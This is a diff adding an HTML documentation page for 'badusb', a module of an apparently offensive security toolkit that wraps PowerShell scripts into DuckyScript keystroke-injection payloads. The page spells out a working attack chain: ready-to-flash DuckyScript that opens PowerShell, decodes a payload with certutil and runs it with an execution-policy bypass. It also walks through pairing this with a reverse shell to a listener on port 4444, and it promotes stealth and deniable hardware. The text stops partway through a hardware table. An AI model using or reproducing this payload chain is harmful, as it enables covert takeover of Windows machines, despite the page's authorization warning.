@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>badusb - SecV Documentation</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; -webkit-font-smoothing: antialiased; }
+
+:root {
+  --bg:      #050505;
+  --bg1:     #0d0d0d;
+  --bg2:     #141414;
+  --bg3:     #1c1c1c;
+  --border:  rgba(255,255,255,0.06);
+  --border2: rgba(255,255,255,0.13);
+  --border3: rgba(255,255,255,0.2);
+  --text:    #a8a8a8;
+  --muted:   #505050;
+  --dim:     #252525;
+  --white:   #f0f0f0;
+  --off:     #d8d8d8;
+  --grey:    #787878;
+  --acc:     #88aacc;
+  --mono:    'JetBrains Mono', monospace;
+  --disp:    'Syne', sans-serif;
+  --nav-h:   52px;
+  --transition: 0.16s ease;
+}
+
+body { font-family: var(--mono); background: var(--bg); color: var(--text); line-height: 1.7; overflow-x: hidden; }
+::-webkit-scrollbar { width: 4px; height: 4px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--bg3); border-radius: 2px; }
+
+nav {
+  position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+  height: var(--nav-h); display: flex; align-items: center;
+  justify-content: space-between; padding: 0 2.5rem;
+  border-bottom: 1px solid transparent; transition: border-color 0.3s, background 0.3s;
+}
+nav.scrolled { background: rgba(5,5,5,0.96); backdrop-filter: blur(16px); border-color: var(--border); }
+.logo { font-family: var(--disp); font-size: 0.9rem; font-weight: 700; color: var(--off); text-decoration: none; letter-spacing: 0.01em; display: flex; align-items: center; gap: 0.55rem; }
+.logo-mark { width: 6px; height: 6px; background: var(--white); flex-shrink: 0; }
+.nav-links { display: flex; align-items: center; gap: 0.1rem; }
+.nav-link { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); text-decoration: none; padding: 0.4rem 0.75rem; transition: color var(--transition); }
+.nav-link:hover { color: var(--text); }
+.nav-link.active { color: var(--white); }
+.nav-btn { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--text); text-decoration: none; padding: 0.4rem 0.9rem; border: 1px solid var(--border2); margin-left: 0.5rem; transition: border-color var(--transition), color var(--transition); }
+.nav-btn:hover { border-color: var(--white); color: var(--white); }
+.nav-btn.primary { background: var(--white); border-color: var(--white); color: var(--bg); }
+.nav-btn.primary:hover { background: transparent; color: var(--white); }
+.nav-burger { display: none; background: none; border: 1px solid var(--border2); padding: 0.4rem 0.6rem; cursor: pointer; border-radius: 3px; flex-direction: column; gap: 4px; }
+.nav-burger span { display: block; width: 18px; height: 1px; background: var(--text); transition: transform var(--transition), opacity var(--transition); }
+body.nav-open .nav-burger span:nth-child(1) { transform: rotate(45deg) translate(3.5px,3.5px); }
+body.nav-open .nav-burger span:nth-child(2) { opacity: 0; }
+body.nav-open .nav-burger span:nth-child(3) { transform: rotate(-45deg) translate(3.5px,-3.5px); }
+
+.page { max-width: 1080px; margin: 0 auto; padding: 0 2.5rem; }
+.doc-header { padding-top: calc(var(--nav-h) + 3.5rem); padding-bottom: 3.5rem; border-bottom: 1px solid var(--border); animation: rise 0.45s ease both; }
+@keyframes rise { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:none; } }
+
+.breadcrumb { font-size: 0.56rem; letter-spacing: 0.18em; text-transform: uppercase; color: var(--muted); margin-bottom: 1.75rem; display: flex; align-items: center; gap: 0.6rem; flex-wrap: wrap; }
+.breadcrumb a { color: var(--muted); text-decoration: none; transition: color var(--transition); }
+.breadcrumb a:hover { color: var(--text); }
+.breadcrumb span { color: var(--dim); }
+
+.module-meta { display: flex; align-items: flex-start; justify-content: space-between; gap: 2.5rem; flex-wrap: wrap; }
+.module-title { font-family: var(--disp); font-size: clamp(2.8rem, 6vw, 4.8rem); font-weight: 800; letter-spacing: -0.04em; color: var(--white); line-height: 0.95; margin-bottom: 0.85rem; }
+.module-title span { color: var(--grey); font-weight: 400; }
+.module-sub { font-size: 0.84rem; color: var(--muted); line-height: 1.85; max-width: 500px; margin-bottom: 1.5rem; }
+.module-tags { display: flex; gap: 0.4rem; flex-wrap: wrap; }
+.tag { font-size: 0.5rem; letter-spacing: 0.14em; text-transform: uppercase; padding: 0.18rem 0.55rem; border: 1px solid var(--border2); color: var(--muted); }
+.tag.hi { color: var(--white); border-color: rgba(255,255,255,0.28); }
+.module-stats { display: flex; flex-direction: column; gap: 1rem; min-width: 210px; }
+.stat-row { display: flex; justify-content: space-between; align-items: center; padding: 0.55rem 0; border-bottom: 1px solid var(--border); font-size: 0.68rem; gap: 2rem; }
+.stat-row:last-child { border-bottom: none; }
+.stat-lbl { letter-spacing: 0.12em; text-transform: uppercase; color: var(--muted); }
+.stat-v { color: var(--white); font-weight: 500; }
+
+.doc-body { display: grid; grid-template-columns: 200px 1fr; gap: 4rem; padding: 3.5rem 0; align-items: start; }
+.sidebar { position: sticky; top: calc(var(--nav-h) + 1rem); }
+.sidebar-nav { list-style: none; }
+.sidebar-nav li { margin-bottom: 0.05rem; }
+.sidebar-nav a { display: block; font-size: 0.62rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--muted); text-decoration: none; padding: 0.4rem 0; border-left: 2px solid transparent; padding-left: 0.75rem; transition: color var(--transition), border-color var(--transition); }
+.sidebar-nav a:hover { color: var(--text); border-color: var(--border2); }
+.sidebar-nav a.active { color: var(--white); border-color: var(--white); }
+.sidebar-sep { font-size: 0.48rem; letter-spacing: 0.2em; text-transform: uppercase; color: var(--dim); padding: 0.7rem 0 0.25rem 0.75rem; margin-top: 0.5rem; }
+
+.content section { padding-bottom: 3.5rem; border-bottom: 1px solid var(--border); margin-bottom: 3.5rem; }
+.content section:last-child { border-bottom: none; }
+.sec-label { font-size: 0.52rem; letter-spacing: 0.22em; text-transform: uppercase; color: var(--grey); margin-bottom: 0.55rem; }
+
+h2 { font-family: var(--disp); font-size: clamp(1.4rem, 2.5vw, 2rem); font-weight: 800; letter-spacing: -0.03em; color: var(--white); margin-bottom: 1.25rem; line-height: 1.05; }
+h3 { font-family: var(--disp); font-size: 1.05rem; font-weight: 700; color: var(--off); margin: 2rem 0 0.8rem; letter-spacing: -0.01em; }
+p { font-size: 0.82rem; color: var(--text); line-height: 1.85; margin-bottom: 0.9rem; }
+p:last-child { margin-bottom: 0; }
+a { color: var(--grey); }
+a:hover { color: var(--white); }
+
+pre { background: var(--bg1); border: 1px solid var(--border); border-left: 3px solid var(--border3); padding: 1.1rem 1.35rem; overflow-x: auto; margin: 1rem 0; font-size: 0.76rem; line-height: 1.75; border-radius: 0 2px 2px 0; }
+code { font-family: var(--mono); font-size: 0.76rem; background: var(--bg1); border: 1px solid var(--border); padding: 0.08rem 0.35rem; color: var(--off); }
+pre code { background: none; border: none; padding: 0; font-size: inherit; }
+.comment { color: var(--muted); font-style: italic; }
+.kw { color: var(--white); }
+.str { color: var(--grey); }
+
+.table-wrap { overflow-x: auto; margin: 1rem 0; -webkit-overflow-scrolling: touch; }
+table { width: 100%; border-collapse: collapse; font-size: 0.74rem; min-width: 420px; }
+th { font-family: var(--mono); font-size: 0.54rem; letter-spacing: 0.14em; text-transform: uppercase; color: var(--grey); text-align: left; padding: 0.6rem 1rem; border-bottom: 1px solid var(--border2); background: var(--bg1); white-space: nowrap; }
+td { padding: 0.7rem 1rem; border-bottom: 1px solid var(--border); color: var(--text); vertical-align: top; line-height: 1.65; }
+tr:last-child td { border-bottom: none; }
+tr:hover td { background: var(--bg1); }
+td:first-child { color: var(--off); font-weight: 500; white-space: nowrap; }
+td code { font-size: 0.7rem; }
+
+.feat-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1px; background: var(--border); border: 1px solid var(--border); margin: 1.25rem 0; }
+.feat-cell { background: var(--bg); padding: 1.1rem; transition: background var(--transition); }
+.feat-cell:hover { background: var(--bg1); }
+.feat-icon { font-size: 0.54rem; letter-spacing: 0.14em; text-transform: uppercase; color: var(--grey); margin-bottom: 0.4rem; }
+.feat-name { font-family: var(--disp); font-size: 0.88rem; font-weight: 700; color: var(--white); margin-bottom: 0.3rem; }
+.feat-desc { font-size: 0.72rem; color: var(--muted); line-height: 1.6; }
+
+.process-chain { display: flex; flex-direction: column; border: 1px solid var(--border); margin: 1.25rem 0; }
+.pc-step { display: grid; grid-template-columns: 2.5rem 1fr; gap: 0.85rem; padding: 1rem 1.15rem; border-bottom: 1px solid var(--border); align-items: start; background: var(--bg); transition: background var(--transition); }
+.pc-step:last-child { border-bottom: none; }
+.pc-step:hover { background: var(--bg1); }
+.pc-num { font-family: var(--disp); font-size: 0.72rem; font-weight: 800; color: var(--muted); }
+.pc-title { font-size: 0.76rem; font-weight: 600; color: var(--white); margin-bottom: 0.25rem; }
+.pc-body { font-size: 0.68rem; color: var(--muted); line-height: 1.65; }
+
+.callout { display: flex; gap: 0.75rem; padding: 0.95rem 1.15rem; border: 1px solid var(--border2); border-left: 3px solid var(--border2); margin: 1.25rem 0; font-size: 0.78rem; line-height: 1.7; color: var(--text); border-radius: 0 2px 2px 0; }
+.callout.warn { border-left-color: var(--grey); }
+.callout.crit { border-left-color: var(--white); background: rgba(255,255,255,0.02); }
+.callout-mark { font-size: 0.64rem; color: var(--grey); flex-shrink: 0; margin-top: 0.15rem; }
+
+footer { border-top: 1px solid var(--border); margin-top: 2rem; }
+.foot-inner { max-width: 1080px; margin: 0 auto; padding: 1.5rem 2.5rem; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 1rem; }
+.foot-brand { font-family: var(--disp); font-size: 0.88rem; font-weight: 700; color: var(--muted); text-decoration: none; }
+.foot-links { display: flex; gap: 1.75rem; }
+.foot-link { font-size: 0.55rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); text-decoration: none; transition: color var(--transition); }
+.foot-link:hover { color: var(--text); }
+.foot-note { font-size: 0.52rem; color: var(--dim); letter-spacing: 0.06em; }
+
+@media (max-width: 860px) {
+  nav { padding: 0 1.5rem; }
+  .nav-links { display: none; }
+  .nav-burger { display: flex; }
+  body.nav-open .nav-links { display: flex; position: fixed; top: var(--nav-h); left: 0; right: 0; background: var(--bg); border-bottom: 1px solid var(--border); flex-direction: column; padding: 1rem 1.5rem 1.5rem; gap: 0.25rem; align-items: flex-start; z-index: 99; }
+  .page { padding: 0 1.5rem; }
+  .doc-body { grid-template-columns: 1fr; gap: 0; }
+  .sidebar { display: none; }
+  .module-title { font-size: 2.6rem; }
+  .module-stats { min-width: unset; width: 100%; }
+  pre { font-size: 0.7rem; }
+}
+@media (max-width: 540px) {
+  .feat-grid { grid-template-columns: 1fr; }
+  .page { padding: 0 1rem; }
+  pre { padding: 0.85rem 1rem; }
+  .doc-header { padding-top: calc(var(--nav-h) + 2rem); }
+}
+</style>
+</head>
+<body>
+
+<nav id="nav">
+  <a class="logo" href="../index.html">
+    <span class="logo-mark"></span>
+    SecVulnHub
+  </a>
+  <div class="nav-links">
+    <a class="nav-link" href="../index.html">Docs</a>
+    <a class="nav-link" href="netrecon.html">netrecon</a>
+    <a class="nav-link" href="android_pentest.html">android</a>
+    <a class="nav-link" href="wifi_monitor.html">wifi_monitor</a>
+    <a class="nav-link active" href="badusb.html">badusb</a>
+    <a class="nav-btn" href="https://github.com/0xb0rn3" target="_blank">GitHub</a>
+    <a class="nav-btn primary" href="https://discord.gg/SecVulnHub" target="_blank">Discord</a>
+  </div>
+  <button class="nav-burger" id="burger" aria-label="Toggle menu">
+    <span></span><span></span><span></span>
+  </button>
+</nav>
+
+<div class="page">
+
+  <div class="doc-header">
+    <div class="breadcrumb">
+      <a href="../index.html">SecVulnHub</a>
+      <span>/</span>
+      <a href="../index.html#modules">Modules</a>
+      <span>/</span>
+      badusb
+    </div>
+    <div class="module-meta">
+      <div>
+        <h1 class="module-title">badusb<span>.</span></h1>
+        <p class="module-sub">Converts a PowerShell .ps1 script into a base64 DuckyScript payload. On execution the USB HID device opens Win+R → PowerShell, then certutil-decodes and runs your payload — no external tools needed on the attack machine.</p>
+        <div class="module-tags">
+          <span class="tag hi">secV Module</span>
+          <span class="tag">BadUSB</span>
+          <span class="tag">DuckyScript</span>
+          <span class="tag">HID Attack</span>
+          <span class="tag">Physical Access</span>
+          <span class="tag">Windows</span>
+          <span class="tag">v1.0.0</span>
+        </div>
+      </div>
+      <div class="module-stats">
+        <div class="stat-row"><span class="stat-lbl">Category</span><span class="stat-v">Physical</span></div>
+        <div class="stat-row"><span class="stat-lbl">Language</span><span class="stat-v">Python 3</span></div>
+        <div class="stat-row"><span class="stat-lbl">Location</span><span class="stat-v">tools/phys/badusb/</span></div>
+        <div class="stat-row"><span class="stat-lbl">Author</span><span class="stat-v">0xb0rn3</span></div>
+        <div class="stat-row"><span class="stat-lbl">Version</span><span class="stat-v">v1.0.0</span></div>
+        <div class="stat-row"><span class="stat-lbl">License</span><span class="stat-v">MIT</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="doc-body">
+
+    <aside class="sidebar">
+      <ul class="sidebar-nav">
+        <li><div class="sidebar-sep">Overview</div></li>
+        <li><a href="#overview" class="active">What it does</a></li>
+        <li><a href="#quickstart">Quick Start</a></li>
+        <li><div class="sidebar-sep">Reference</div></li>
+        <li><a href="#flow">Attack Flow</a></li>
+        <li><a href="#params">Parameters</a></li>
+        <li><a href="#output">Output Format</a></li>
+        <li><div class="sidebar-sep">More</div></li>
+        <li><a href="#examples">Examples</a></li>
+        <li><a href="#hardware">Hardware</a></li>
+        <li><a href="#opsec">OPSEC</a></li>
+        <li><div class="sidebar-sep">Internals</div></li>
+        <li><a href="#arch-deep-dive">Architecture</a></li>
+        <li><a href="#usb-enum">USB Enumeration</a></li>
+        <li><a href="#hid-report-descriptor">HID Descriptor</a></li>
+        <li><a href="#duckyscript-internals">DuckyScript</a></li>
+        <li><a href="#badusb-customization">Customization</a></li>
+        <li><div class="sidebar-sep">Study</div></li>
+        <li><a href="#learning-path">Learning Path</a></li>
+      </ul>
+    </aside>
+
+    <div class="content">
+
+      <!-- Beginner Startup -->
+      <div id="beginner-startup" style="background:linear-gradient(135deg,#0d2018,#111a15);border:2px solid rgba(74,222,128,0.35);border-radius:12px;padding:1.6rem 2rem;margin-bottom:2.5rem">
+        <div style="display:flex;align-items:center;gap:0.8rem;margin-bottom:1rem">
+          <div style="width:32px;height:32px;background:#1a4a2e;border:1px solid rgba(74,222,128,0.4);border-radius:7px;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+          </div>
+          <div>
+            <div style="font-size:0.48rem;letter-spacing:0.22em;text-transform:uppercase;color:rgba(74,222,128,0.7)">Beginner Startup</div>
+            <div style="font-size:0.72rem;font-weight:700;color:#f0ede6">New to BadUSB or HID attacks? Start here.</div>
+          </div>
+          <a href="../foundations.html" style="margin-left:auto;font-size:0.52rem;color:#4ade80;text-decoration:none;border:1px solid rgba(74,222,128,0.35);padding:0.3rem 0.7rem;border-radius:5px;white-space:nowrap" onmouseover="this.style.background='rgba(74,222,128,0.1)'" onmouseout="this.style.background='transparent'">Foundations guide &rarr;</a>
+        </div>
+        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:0.8rem;margin-bottom:1.2rem">
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">What you need first</div>
+            <ul style="list-style:none;font-size:0.58rem;color:#666;line-height:1.9">
+              <li>▸ A PowerShell <code>.ps1</code> payload script</li>
+              <li>▸ A USB HID device (Rubber Ducky, Hak5, DigiSpark, etc.)</li>
+              <li>▸ Physical access to an authorized Windows machine</li>
+              <li>▸ DuckyScript encoder for your device</li>
+            </ul>
+          </div>
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">Your first safe command</div>
+            <pre style="font-size:0.58rem;color:#9a9a9a;line-height:1.7;margin:0;white-space:pre-wrap">secV (badusb) ❯ set file_path /tmp/rev.ps1
+secV (badusb) ❯ run target</pre>
+          </div>
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">Key concepts</div>
+            <ul style="list-style:none;font-size:0.58rem;color:#666;line-height:1.9">
+              <li><span style="color:#4ade80">&bull;</span> BadUSB = USB device that pretends to be a keyboard</li>
+              <li><span style="color:#fbbf24">&bull;</span> DuckyScript = language that describes keystrokes</li>
+              <li><span style="color:#f87171">&bull;</span> certutil = Windows tool used to decode base64 payload</li>
+            </ul>
+          </div>
+        </div>
+        <div style="font-size:0.58rem;color:#555;border-top:1px solid rgba(255,255,255,0.06);padding-top:0.8rem">
+          <strong style="color:#888">Key terms:</strong>
+          <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">HID Attack</a> — Human Interface Device attack — USB device emulates keyboard/mouse to inject commands &nbsp;·&nbsp;
+          <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">DuckyScript</a> — scripting language for USB Rubber Ducky and compatible devices &nbsp;·&nbsp;
+          <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">certutil</a> — Windows built-in certificate utility that can decode base64 (LOLBin)
+          &nbsp;&mdash;&nbsp;<a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Full glossary &rarr;</a>
+        </div>
+      </div>
+
+      <!-- Overview -->
+      <section id="overview">
+        <p class="sec-label">Overview</p>
+        <h2>What badusb does</h2>
+        <p><code>badusb</code> takes a PowerShell <code>.ps1</code> script, base64-encodes it, and wraps it inside a DuckyScript payload. When the USB device is inserted into a Windows machine it emulates a keyboard and types the entire attack sequence automatically: Win+R to open Run, launch PowerShell, then invoke <code>certutil</code> to decode and execute your payload in memory. No external tools are needed on the attack machine.</p>
+        <p>Compatible with USB Rubber Ducky (Hak5), O.MG Cable, DigiSpark, Raspberry Pi Zero (as HID), and any device that accepts DuckyScript payloads via an encoder. Output is a plain-text <code>.txt</code> file ready to flash.</p>
+
+        <div class="callout crit">
+          <span class="callout-mark">!</span>
+          <span><strong>Authorization required.</strong> This module generates payloads for physical access attacks. Only use against systems you own or have explicit written authorization to test. Unauthorized use is a criminal offence in most jurisdictions.</span>
+        </div>
+
+        <div class="feat-grid">
+          <div class="feat-cell">
+            <div class="feat-icon">Encode</div>
+            <div class="feat-name">Base64 Wrap</div>
+            <div class="feat-desc">Encodes any <code>.ps1</code> script as base64. The payload is fully self-contained in the DuckyScript — nothing needs to be pre-staged on the target.</div>
+          </div>
+          <div class="feat-cell">
+            <div class="feat-icon">Delivery</div>
+            <div class="feat-name">certutil LOLBin</div>
+            <div class="feat-desc">Uses Windows' built-in <code>certutil -decode</code> to decode and write the payload to a temp file, then executes it. No external download required — entirely local.</div>
+          </div>
+          <div class="feat-cell">
+            <div class="feat-icon">Stealth</div>
+            <div class="feat-name">No Staged Server</div>
+            <div class="feat-desc">Payload travels on the device itself — no HTTP server, no DNS callback, no network indicator at delivery time. The payload executes locally from a temp file.</div>
+          </div>
+          <div class="feat-cell">
+            <div class="feat-icon">Compat</div>
+            <div class="feat-name">Any DuckyDevice</div>
+            <div class="feat-desc">Output is plain DuckyScript text. Flash to Rubber Ducky with the encoder tool, or adapt for DigiSpark/O.MG with the appropriate IDE or firmware.</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Quick Start -->
+      <section id="quickstart">
+        <p class="sec-label">Getting Started</p>
+        <h2>Quick start</h2>
+
+        <h3>Basic — encode a PowerShell script</h3>
+        <pre><code>secV ❯ <span class="kw">use</span> badusb
+secV (badusb) ❯ <span class="kw">set</span> file_path /tmp/rev.ps1
+secV (badusb) ❯ <span class="kw">run</span> target
+
+<span class="comment"># Output: ~/.secv/badusb/rev_badusb.txt</span></code></pre>
+
+        <h3>With metadata and slow-hardware delay</h3>
+        <pre><code>secV (badusb) ❯ <span class="kw">set</span> file_path /tmp/rev.ps1
+secV (badusb) ❯ <span class="kw">set</span> title "Reverse Shell"
+secV (badusb) ❯ <span class="kw">set</span> author "operator"
+secV (badusb) ❯ <span class="kw">set</span> ducky_lang true
+secV (badusb) ❯ <span class="kw">set</span> delay_after_ps 1200
+secV (badusb) ❯ <span class="kw">run</span> target</code></pre>
+
+        <div class="callout warn">
+          <span class="callout-mark">!</span>
+          <span><strong>delay_after_ps</strong> is the millisecond wait between opening PowerShell and typing the certutil decode command. On slow or cold machines PowerShell takes longer to initialize. Start at 1000 ms and increase to 1500–2000 ms if the payload fails to execute because the window wasn't ready.</span>
+        </div>
+      </section>
+
+      <!-- Attack Flow -->
+      <section id="flow">
+        <p class="sec-label">How It Works</p>
+        <h2>Attack flow</h2>
+        <p>When the USB device is inserted, the DuckyScript is replayed as physical keystrokes. The sequence below takes approximately 3–5 seconds on a modern machine.</p>
+
+        <div class="process-chain">
+          <div class="pc-step">
+            <div class="pc-num">01</div>
+            <div>
+              <div class="pc-title">Win+R — Open Run dialog</div>
+              <div class="pc-body">The device sends the Windows key + R keystroke combination, which opens the Run dialog on any Windows version. Delay: 300–500 ms to ensure the dialog is visible.</div>
+            </div>
+          </div>
+          <div class="pc-step">
+            <div class="pc-num">02</div>
+            <div>
+              <div class="pc-title">Type "powershell" + Enter</div>
+              <div class="pc-body">Types <code>powershell</code> into the Run dialog and presses Enter. Windows launches PowerShell in the foreground. <code>delay_after_ps</code> (ms) is waited before the next keystroke to give PowerShell time to open.</div>
+            </div>
+          </div>
+          <div class="pc-step">
+            <div class="pc-num">03</div>
+            <div>
+              <div class="pc-title">Write base64 payload to temp file via certutil</div>
+              <div class="pc-body">Types a <code>certutil -decode &lt;b64data&gt; %TEMP%\p.ps1</code> command into the PowerShell window. The base64-encoded <code>.ps1</code> content is embedded directly in the DuckyScript — no network connection needed.</div>
+            </div>
+          </div>
+          <div class="pc-step">
+            <div class="pc-num">04</div>
+            <div>
+              <div class="pc-title">Execute decoded payload</div>
+              <div class="pc-body">Types <code>powershell -ExecutionPolicy Bypass -File %TEMP%\p.ps1</code> and presses Enter. The payload executes. Typical use: reverse shell back to a pre-started revshell handler.</div>
+            </div>
+          </div>
+          <div class="pc-step">
+            <div class="pc-num">05</div>
+            <div>
+              <div class="pc-title">Cleanup (optional)</div>
+              <div class="pc-body">Optionally, type <code>del %TEMP%\p.ps1</code> to remove the staged file after execution. Enable by setting <code>cleanup true</code>.</div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Parameters -->
+      <section id="params">
+        <p class="sec-label">Reference</p>
+        <h2>Parameters</h2>
+
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Parameter</th><th>Type</th><th>Default</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><code>file_path</code></td>
+              <td>string</td>
+              <td><em>required</em></td>
+              <td>Path to the PowerShell <code>.ps1</code> file to encode. Any valid <code>.ps1</code> script is accepted.</td>
+            </tr>
+            <tr>
+              <td><code>title</code></td>
+              <td>string</td>
+              <td>badusb_payload</td>
+              <td>DuckyScript title comment embedded at the top of the output file. Used for documentation only — not sent to the target.</td>
+            </tr>
+            <tr>
+              <td><code>author</code></td>
+              <td>string</td>
+              <td>secV</td>
+              <td>Author name embedded in the DuckyScript header comment. Documentation only.</td>
+            </tr>
+            <tr>
+              <td><code>ducky_lang</code></td>
+              <td>boolean</td>
+              <td>false</td>
+              <td>Set <code>true</code> to output standard DuckyScript (Hak5 Rubber Ducky v2 / Flipper Zero compatible). Set <code>false</code> for a compact format.</td>
+            </tr>
+            <tr>
+              <td><code>delay_after_ps</code></td>
+              <td>integer</td>
+              <td>1000</td>
+              <td>Milliseconds to wait after launching PowerShell before sending the certutil command. On slow or cold machines, increase to 1500–2000 if payload execution fails.</td>
+            </tr>
+          </tbody>
+        </table>
+        </div>
+      </section>
+
+      <!-- Output Format -->
+      <section id="output">
+        <p class="sec-label">Reference</p>
+        <h2>Output format</h2>
+        <p>Output is saved to <code>~/.secv/badusb/&lt;stem&gt;_badusb.txt</code> where <code>&lt;stem&gt;</code> is the input filename without extension. Example: input <code>/tmp/rev.ps1</code> → output <code>~/.secv/badusb/rev_badusb.txt</code>.</p>
+
+        <h3>Example DuckyScript output</h3>
+        <pre><code><span class="comment">REM Title: Reverse Shell</span>
+<span class="comment">REM Author: operator</span>
+<span class="comment">REM Target: Windows 10/11</span>
+<span class="comment">REM Generated by secV badusb v1.0.0</span>
+
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 1200
+STRING certutil -decode C:\Windows\Temp\p.b64 C:\Windows\Temp\p.ps1
+ENTER
+DELAY 800
+STRING powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\p.ps1
+ENTER</code></pre>
+
+        <p>The base64-encoded payload content replaces the <code>C:\Windows\Temp\p.b64</code> step — in the actual output, the device writes the encoded content to a temp file first, then certutil decodes it in place.</p>
+
+        <h3>Flash to device</h3>
+        <p>Flash using the encoder appropriate for your device:</p>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Device</th><th>Tool</th><th>Notes</th></tr></thead>
+          <tbody>
+            <tr><td>USB Rubber Ducky (Gen 1)</td><td>Hak5 online encoder</td><td>Compile to inject.bin, copy to SD card root</td></tr>
+            <tr><td>USB Rubber Ducky (Gen 2+)</td><td>Hak5 online encoder</td><td>DuckyScript 3.0 — enable ATTACKMODE HID STORAGE</td></tr>
+            <tr><td>Flipper Zero</td><td>qFlipper app or SD copy</td><td>Place .txt in SD:/badusb/; run from BadUSB app</td></tr>
+            <tr><td>O.MG Cable</td><td>O.MG web UI</td><td>Paste DuckyScript in web interface, trigger via Wi-Fi</td></tr>
+            <tr><td>DigiSpark ATtiny85</td><td>Arduino IDE</td><td>Manually translate to DigiKeyboard.h sketch</td></tr>
+          </tbody>
+        </table>
+        </div>
+      </section>
+
+      <!-- Examples -->
+      <section id="examples">
+        <p class="sec-label">Usage</p>
+        <h2>Examples</h2>
+
+        <h3>Generate a reverse shell payload</h3>
+        <pre><code><span class="comment"># Step 1: Generate a PowerShell reverse shell payload</span>
+secV ❯ <span class="kw">use</span> revshell
+secV (revshell) ❯ <span class="kw">set</span> mode generate
+secV (revshell) ❯ <span class="kw">set</span> lhost 10.10.14.5
+secV (revshell) ❯ <span class="kw">set</span> shell powershell
+secV (revshell) ❯ <span class="kw">run</span> target
+<span class="comment"># → copy output to /tmp/rev.ps1</span>
+
+<span class="comment"># Step 2: Encode for BadUSB</span>
+secV ❯ <span class="kw">use</span> badusb
+secV (badusb) ❯ <span class="kw">set</span> file_path /tmp/rev.ps1
+secV (badusb) ❯ <span class="kw">set</span> delay_after_ps 1000
+secV (badusb) ❯ <span class="kw">run</span> target
+<span class="comment"># → output: ~/.secv/badusb/rev_badusb.txt — flash to device</span>
+
+<span class="comment"># Step 3: Start listener, insert device into target</span>
+secV ❯ <span class="kw">use</span> revshell
+secV (revshell) ❯ <span class="kw">set</span> mode serve
+secV (revshell) ❯ <span class="kw">set</span> ports 4444
+secV (revshell) ❯ <span class="kw">run</span> target</code></pre>
+
+        <h3>Slow machine — increase delay</h3>
+        <pre><code>secV (badusb) ❯ <span class="kw">set</span> file_path /tmp/payload.ps1
+secV (badusb) ❯ <span class="kw">set</span> delay_after_ps 2000  <span class="comment"># 2 seconds for old/slow hardware</span>
+secV (badusb) ❯ <span class="kw">run</span> target</code></pre>
+
+        <h3>Full metadata output</h3>
+        <pre><code>secV (badusb) ❯ <span class="kw">set</span> file_path /tmp/recon.ps1
+secV (badusb) ❯ <span class="kw">set</span> title "System Recon"
+secV (badusb) ❯ <span class="kw">set</span> author "RedTeam"
+secV (badusb) ❯ <span class="kw">set</span> ducky_lang true
+secV (badusb) ❯ <span class="kw">run</span> target</code></pre>
+      </section>
+
+      <!-- Hardware -->
+      <section id="hardware">
+        <p class="sec-label">Hardware</p>
+        <h2>Supported hardware</h2>
+        <p>Any device that accepts DuckyScript and emulates a USB HID keyboard works with badusb's output. The most common options:</p>
+
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Device</th><th>Cost</th><th>Notes</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>USB Rubber Ducky (Hak5)</td>
+              <td>~$80 USD</td>
+              <td>Purpose-built, reliable timing, best compatibility. The original DuckyScript device. Recommended for professional use.</td>
+            </tr>
+            <tr>
+              <td>Flipper Zero (BadUSB mode)</td>
+              <td>~$170 USD</td>
+              <td>Multi-tool — BadUSB is one of many features. Place <code>.txt</code> file on SD card and run from the BadUSB menu.</td>
+            </tr>
+            <tr>
+              <td>O.MG Cable</td>
+              <td>~$120 USD</td>
+              <td>Disguised as a charging cable. Triggered over Wi-Fi. High deniability for physical access scenarios.</td>
+            </tr>
+            <tr>
+              <td>DigiSpark ATtiny85</td>
+              <td>~$3 USD</td>
+              <td>Cheapest option. Requires Arduino IDE and manual translation. Timing less reliable. Good for prototyping.</td>
+            </tr>
